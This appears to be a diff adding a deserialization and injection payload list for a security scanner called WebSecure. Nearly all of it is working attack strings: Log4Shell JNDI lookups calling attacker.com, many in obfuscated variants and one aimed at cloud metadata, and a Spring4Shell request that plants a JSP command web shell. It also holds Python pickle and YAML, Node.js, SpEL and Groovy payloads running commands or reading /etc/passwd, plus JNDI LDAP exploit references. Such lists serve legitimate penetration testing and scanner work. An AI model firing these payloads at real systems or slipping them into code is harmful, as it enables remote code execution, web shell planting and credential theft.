@@ -1,0 +1,165 @@
+# Deserialization Payloads — WebSecure
+# Java | PHP | Python | .NET | Ruby | Node.js | YAML | Log4Shell | Spring4Shell
+
+# ── LOG4SHELL / LOG4J (CVE-2021-44228) ──
+${jndi:ldap://attacker.com/a}
+${jndi:ldaps://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${jndi:dns://attacker.com/a}
+${jndi:iiop://attacker.com/a}
+${jndi:corba://attacker.com/a}
+${jndi:nds://attacker.com/a}
+${jndi:ldap://127.0.0.1:1389/exploit}
+${jndi:ldap://169.254.169.254/latest/meta-data/}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+${${upper:j}ndi:${upper:l}${upper:d}${lower:a}${upper:p}://attacker.com/a}
+${j${::-n}di:ldap://attacker.com/a}
+${j${lower:n}di:ldap://attacker.com/a}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
+${j${k8s:k5:-ND}i:ldap://attacker.com/a}
+${j${main:\k5:-Nd}i:ldap://attacker.com/a}
+${jn${::-d}i:ldap://attacker.com/a}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://attacker.com/a}
+${${::-j}ndi:${::-l}dap://attacker.com/}
+%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D
+\${jndi:ldap://attacker.com/a}
+{{jndi:ldap://attacker.com/a}}
+${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
+
+# ── SPRING4SHELL (CVE-2022-22965) ──
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=ws_shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+class.module.classLoader.DefaultAssertionStatus=true
+
+# ── JAVA DESERIALIZATION (URLDNS gadget — safe detection) ──
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcHAUBgFX
+rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzdAIAAHhwAAAAAXNyABFqYXZhLm5ldC5VUkx5JQYJAB8BAAAHeAA
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTAkPEI7WvLAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPOWYFLn4GaQIAA0wACmNvbXBhcmF0b3JxAH4AAUwAC3Byb3BlcnR5TmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACXRyYW5zZm9ybXQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXNxAH4AAw==
+
+# ── JAVA DESERIALIZATION MARKERS (for detection) ──
+aced0005
+rO0AB
+%AC%ED%00%05
+\xac\xed\x00\x05
+
+# ── PHP DESERIALIZATION ──
+O:8:"stdClass":0:{}
+O:8:"stdClass":1:{s:4:"test";s:4:"pwnd";}
+a:1:{i:0;s:4:"test";}
+O:14:"App\Models\User":1:{s:4:"name";s:5:"admin";}
+O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:4:"test";}
+a:2:{s:8:"username";s:5:"admin";s:8:"password";s:4:"test";}
+O:29:"Illuminate\Support\MessageBag":0:{}
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"*listeners";a:1:{s:10:"some_event";a:1:{i:0;s:6:"system";}}}s:8:"*event";s:2:"id";}
+C:11:"ArrayObject":60:{x:i:0;a:1:{s:4:"test";s:4:"pwnd";};m:a:0:{}}
+
+# ── PHP TYPE JUGGLING ──
+{"admin": true}
+{"admin": 1}
+{"role": "admin"}
+{"type": 0}
+{"auth": "0"}
+{"session": "0"}
+0==true
+"0"==false
+"0"==0
+[]=false
+"false"==false
+
+# ── .NET BINARY FORMATTER ──
+AAEAAAD/////AQAAAAAAAAAMAQAA
+AAEAAAD/////AQAAAAAAAAwCAAAAS
+00-01-00-00-00-ff-ff-ff-ff-01-00-00-00-00-00-00-00-0c-02-00-00-00
+/wEAAAAAAAAADQIAAAA=
+
+# ── .NET VIEWSTATE / MACHINKEY EXPLOIT ──
+/wEMDgQAAAAAAAAAAAAAAAAAAAAA
+/wEPDwUKLTEyMjM0NTY3OA8WAh4EVGVzdAUEdGVzdBYCHgRUZXN0BQR0ZXN0ZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBkJ0bjAxdOV0mEkEJJwFGcYJSCJHUQc=
+/wEPDwULLTExNjM3MjE0NDgPFgIeBFRlc3QFBHRlc3RkZGTGMgpBo4g8CVuYcqR+aCfq0w==
+
+# ── PYTHON PICKLE ──
+cos
+system
+(S'id'
+tR.
+cos
+system
+(S'cat /etc/passwd'
+tR.
+cposix
+system
+(S'id'
+tR.
+b'\x80\x04\x95$\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x8c\x02id\x94\x85\x94R\x94.'
+gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
+
+# ── PYTHON YAML ──
+!!python/object/apply:os.system ['id']
+!!python/object/apply:subprocess.check_output [['id']]
+!!python/object/apply:os.popen ['id']
+!!python/object/new:str
+  args: ['test']
+!!python/object/apply:exec ['import os;os.system("id")']
+!!python/object/apply:eval ['__import__("os").system("id")']
+&ref
+!!python/object:__main__.Shell
+  cmd: id
+!!python/object/apply:os.system
+- id
+!!python/tuple
+- !!python/object/apply:os.popen
+  - id
+
+# ── NODE.JS DESERIALIZATION ──
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('cat /etc/passwd')}()"}
+{"__proto__": {"polluted": "yes"}}
+{"constructor": {"prototype": {"polluted": "yes"}}}
+
+# ── RUBY MARSHAL ──
+"\x04\x08o:\x0bObject\x06:\x10@test_valuei\x01\x01"
+"\x04\x08[\x07i\x06i\x07"
+BAhvOgtPYmplY3QGOhBAc3RyaW5nIgxpbnB1dF8x
+
+# ── JAVA SPRING EL INJECTION ──
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+${applicationContext.getBean('userService').findAll()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}
+%24%7bT(java.lang.Runtime).getRuntime().exec('id')%7d
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ── JAVA GROOVY ──
+['id'].execute()
+"id".execute()
+['/bin/sh','-c','id'].execute()
+def cmd = ['bash','-c','id']
+def sout = new StringBuffer(); cmd.execute().waitForProcessOutput(sout, sout); sout.toString()
+
+# ── JNDI LDAP REFERENCE ATTACKS ──
+${jndi:ldap://attacker.com:1389/Exploit}
+${jndi:ldap://attacker.com:1389/Basic/Command/Base64/aWQ=}
+${jndi:ldap://attacker.com:1389/TomcatBypass/Command/Base64/aWQ=}
+${jndi:ldap://attacker.com:1389/WebSphere/xyz}
+${jndi:ldap://attacker.com:1389/Groovy/Command/Base64/aWQ=}
+
+# ── XMLRPC DESERIALIZATION ──
+<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
+<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>
+
+# ── JAVA COMMONS COLLECTIONS MARKERS ──
+yv66vg==
+rO0=
+ACED
+
+# ── DESERIALIZATION IN HTTP HEADERS ──
+X-Java-Deserialized-Class: com.example.Exploit
+X-Serialized-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+
+# ── DETECTION PROBES ──
+${jndi:dns://attacker.com/probe}
+{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://attacker.com:1099/exploit"}
+O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+!!python/object/apply:time.sleep [3]
